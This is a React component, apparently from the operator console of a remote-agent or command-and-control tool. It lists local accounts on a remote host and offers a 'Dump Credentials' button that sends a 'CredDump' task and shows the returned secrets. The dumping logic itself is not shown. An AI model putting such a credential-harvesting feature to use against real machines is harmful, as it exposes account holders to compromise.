import { useState, useCallback, useEffect } from 'react';
import { useTranslation } from 'react-i18next';
import { Button, Spinner, Chip } from '@heroui/react';
import { createTask, getTask } from '../../api/tasks';
import type { LocalAccountsResult } from '../../types/models';

interface Props {
  agentId: string;
}

export function LocalAccountsTab({ agentId }: Props) {
  const { t } = useTranslation();
  const [accounts, setAccounts] = useState<LocalAccountsResult | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [credOutput, setCredOutput] = useState<string | null>(null);
  const [credLoading, setCredLoading] = useState(false);
  const [credError, setCredError] = useState<string | null>(null);

  const loadAccounts = useCallback(async () => {
    setLoading(true);
    setError(null);
    try {
      const task = await createTask({ agentId, commandType: 'LocalAccounts', command: '' });
      const taskId = task.id;

      for (let i = 0; i < 20; i++) {
        await new Promise((r) => setTimeout(r, 2000));
        try {
          const t = await getTask(taskId);
          if (t.status === 'Completed') {
            try {
              setAccounts(JSON.parse(t.output || '{"accounts":[]}'));
            } catch {
              setAccounts({ accounts: [] });
            }
            return;
          }
          if (t.status === 'Failed') {
            setError(t.error || 'Task failed');
            return;
          }
        } catch { /* retry */ }
      }
      setError('Timed out waiting for agent response');
    } catch (err: unknown) {
      setError(err instanceof Error ? err.message : String(err));
    } finally {
      setLoading(false);
    }
  }, [agentId]);

  useEffect(() => { loadAccounts(); }, [loadAccounts]);

  const handleCredDump = useCallback(async () => {
    setCredLoading(true);
    setCredOutput(null);
    setCredError(null);
    try {
      const task = await createTask({ agentId, commandType: 'CredDump', command: '' });
      const taskId = task.id;

      for (let i = 0; i < 40; i++) {
        await new Promise((r) => setTimeout(r, 3000));
        try {
          const t = await getTask(taskId);
          if (t.status === 'Completed') {
            setCredOutput(t.output || '[No output]');
            return;
          }
          if (t.status === 'Failed') {
            setCredError(t.error || 'Task failed');
            return;
          }
        } catch { /* retry */ }
      }
      setCredError('Timed out waiting for agent response');
    } catch (err: unknown) {
      setCredError(err instanceof Error ? err.message : String(err));
    } finally {
      setCredLoading(false);
    }
  }, [agentId]);

  return (
    <div className="space-y-4">
      {/* Accounts table */}
      <div>
        <div className="flex items-center justify-between mb-2">
          <h3 className="text-sm font-semibold">{t('system.localAccounts')}</h3>
          <Button size="sm" variant="ghost" isDisabled={loading} onPress={loadAccounts}>
            {t('common.refresh')}
          </Button>
        </div>

        {loading && (
          <div className="flex justify-center py-8">
            <Spinner />
          </div>
        )}

        {error && (
          <div className="p-3 bg-danger-50 text-danger-700 rounded text-sm">{error}</div>
        )}

        {!loading && !error && accounts && accounts.accounts.length === 0 && (
          <div className="text-sm text-default-500 py-4 text-center">
            {t('system.noLocalAccounts')}
          </div>
        )}

        {!loading && accounts && accounts.accounts.length > 0 && (
          <div className="border border-default-200 rounded-lg overflow-hidden">
            <table className="w-full text-sm">
              <thead className="bg-default-50">
                <tr>
                  <th className="text-left px-3 py-2 font-medium">{t('system.accountName')}</th>
                  <th className="text-left px-3 py-2 font-medium">{t('system.groups')}</th>
                </tr>
              </thead>
              <tbody>
                {accounts.accounts.map((a) => (
                  <tr key={a.name} className="border-t border-default-100">
                    <td className="px-3 py-2">
                      <div className="flex items-center gap-2">
                        <span className="font-medium">{a.name}</span>
                        {a.isAdmin && (
                          <Chip size="sm" variant="flat" color="warning">
                            {t('system.administrator')}
                          </Chip>
                        )}
                      </div>
                    </td>
                    <td className="px-3 py-2">
                      <div className="flex flex-wrap gap-1">
                        {a.groups.map((g) => (
                          <Chip key={g} size="sm" variant="flat" className="text-xs">
                            {g}
                          </Chip>
                        ))}
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* Credential dump section */}
      <hr className="border-default-200" />

      <div>
        <div className="flex items-center gap-3 mb-2">
          <Button
            variant="primary"
            isDisabled={credLoading}
            onPress={handleCredDump}
          >
            {credLoading && <Spinner className="mr-2" />}
            {t('system.dumpCredentials')}
          </Button>
          <span className="text-xs text-default-400">
            {t('system.credDumpNote')}
          </span>
        </div>

        {credError && (
          <div className="p-3 bg-danger-50 text-danger-700 rounded text-sm font-mono whitespace-pre-wrap">
            {credError}
          </div>
        )}

        {credOutput && (
          <div className="p-3 bg-default-50 border border-default-200 rounded text-sm font-mono whitespace-pre-wrap max-h-96 overflow-auto">
            {credOutput}
          </div>
        )}
      </div>
    </div>
  );
}
